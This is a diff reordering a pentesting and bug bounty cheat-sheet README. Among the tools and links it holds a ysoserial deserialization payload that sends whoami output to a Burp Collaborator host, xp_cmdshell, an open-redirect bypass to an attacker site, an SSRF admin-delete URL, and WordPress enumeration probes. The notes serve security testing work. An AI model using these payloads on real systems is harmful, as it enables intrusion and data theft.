@@ -9,17 +9,15 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [Blog / Writeups / News](#blog--writeups--news)
 - [Bug Bounty tips](#bug-bounty-tips)
 - [Tools](#tools)
-- [Burp suite](#burp-suite)
-- [Ysoserial](#ysoserial)
-- [GraphQL](#graphql)
-- [WordPress](#wordpress)
 - [XSS](#xss)
 - [SQLi](#sqli)
-- [DLL Hijacking](#dll-hijacking)
-- [IIS - Internet Information Services](#iis---internet-information-services)
 - [Open Redirect](#open-redirect)
 - [SSRF](#ssrf)
 - [Authentication vulnerabilities](#authentication-vulnerabilities)
+- [DLL Hijacking](#dll-hijacking)
+- [GraphQL](#graphql)
+- [WordPress](#wordpress)
+- [IIS - Internet Information Services](#iis---internet-information-services)
 - [Network](#network)
 - [Linux](#linux)
 
@@ -87,8 +85,7 @@ Used in easyg.rb
 - [dex2jar](https://github.com/pxb1988/dex2jar) decompile an .apk into .jar + [jd-gui](https://java-decompiler.github.io/) to see the source of a .jar
 - [jadx-gui](https://github.com/skylot/jadx/releases) another solution to explore the source code of an .apk
 
-
-### Burp suite
+#### Burp suite
 
 To add a domain + subdomains in advanced scopes: `^(.*\.)?test\.com$`
 
@@ -99,48 +96,13 @@ To add a domain + subdomains in advanced scopes: `^(.*\.)?test\.com$`
 - [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
 - [BurpJSLinkFinder](https://github.com/InitRoot/BurpJSLinkFinder)
 
-### Ysoserial
+#### Ysoserial
 
 Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here I needed to run the command `host` and `whoami`:
 
 ```
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-'RATOR-ID>.burpcollaborator.net' | gzip | base64
 ```
-
-### GraphQL
-
-To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.
-
-**GraphQL Introspection query**
-
-```
-{"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
-```
-
-```
-{query: __schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
-```
-
-```
-{"operationName":"IntrospectionQuery","variables":{},"query":"query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n"}
-```
-
-### WordPress
-
-- Data exposure:
-  - `/wp-json/wp/v2/users/`
-  - `/wp-json/th/v1/user_generation`
-  - `/?rest_route=/wp/v2/users`
-- xmlrpc.php enabled, [reference](https://hackerone.com/reports/138869). Send a post request to this endpoint with a body like this:
-  ```xml
-  <?xml version="1.0" encoding="utf-8"?>
-  <methodCall>
-  <methodName>system.listMethods</methodName>
-  <params></params>
-  </methodCall>
-  ```
-- Use [Nuclei](https://github.com/projectdiscovery/nuclei) to detect WordPress websites from a list of targets with: `nuclei -l subdomains.txt -t /root/nuclei-templates/technologies/wordpress-detect.yaml`
-- Scan with WPScan [github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) with: `wpscan --url <domain> --api-token <your-api-token>`
 
 ### XSS
 
@@ -215,6 +177,31 @@ GO
 xp_cmdshell 'COMMAND';
 ```
 
+### Open Redirect
+
+Bypass:
+- https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
+
+### SSRF
+
+- By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
+
+### Network
+```
+ip route add <net_address_in_cdr> via <interface_gateway>
+route add <net_address_in_cdr> mask <net_address_mask_in_cdr> <interface_gateway> (Windows)
+nmap -sn <net_address_in_cdr> | Check hosts alive, adding -A you gather more info for a target
+```
+
+### Authentication vulnerabilities
+
+Common Spots:
+- Vulnerabilities in password-based login
+- Vulnerabilities in multi-factor authentication
+  - Two-factor authentication
+  - Bypass
+  - Bruteforce
+
 ### DLL Hijacking
 
 Using Process Monitor (you can find it in the section [Tools](#tools)) set the filters to find missing dlls.<br/><br/>
@@ -245,6 +232,41 @@ BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 - [hijacklibs.net](https://hijacklibs.net/)
 - [Save the Environment (Variable)](https://www.wietzebeukema.nl/blog/save-the-environment-variables)
 
+### GraphQL
+
+To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.
+
+**GraphQL Introspection query**
+
+```
+{"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
+```
+
+```
+{query: __schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
+```
+
+```
+{"operationName":"IntrospectionQuery","variables":{},"query":"query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n"}
+```
+
+### WordPress
+
+- Data exposure:
+  - `/wp-json/wp/v2/users/`
+  - `/wp-json/th/v1/user_generation`
+  - `/?rest_route=/wp/v2/users`
+- xmlrpc.php enabled, [reference](https://hackerone.com/reports/138869). Send a post request to this endpoint with a body like this:
+  ```xml
+  <?xml version="1.0" encoding="utf-8"?>
+  <methodCall>
+  <methodName>system.listMethods</methodName>
+  <params></params>
+  </methodCall>
+  ```
+- Use [Nuclei](https://github.com/projectdiscovery/nuclei) to detect WordPress websites from a list of targets with: `nuclei -l subdomains.txt -t /root/nuclei-templates/technologies/wordpress-detect.yaml`
+- Scan with WPScan [github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) with: `wpscan --url <domain> --api-token <your-api-token>`
+
 ### IIS - Internet Information Services
 
 - Wordlist [iisfinal.txt](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-discovery-bruteforce)
@@ -262,31 +284,6 @@ BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
   ```
 
 Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
-
-### Open Redirect
-
-Bypass:
-- https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
-
-### SSRF
-
-- By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
-
-### Network
-```
-ip route add <net_address_in_cdr> via <interface_gateway>
-route add <net_address_in_cdr> mask <net_address_mask_in_cdr> <interface_gateway> (Windows)
-nmap -sn <net_address_in_cdr> | Check hosts alive, adding -A you gather more info for a target
-```
-
-### Authentication vulnerabilities
-
-Common Spots:
-- Vulnerabilities in password-based login
-- Vulnerabilities in multi-factor authentication
-  - Two-factor authentication
-  - Bypass
-  - Bruteforce
 
 ### Linux
 
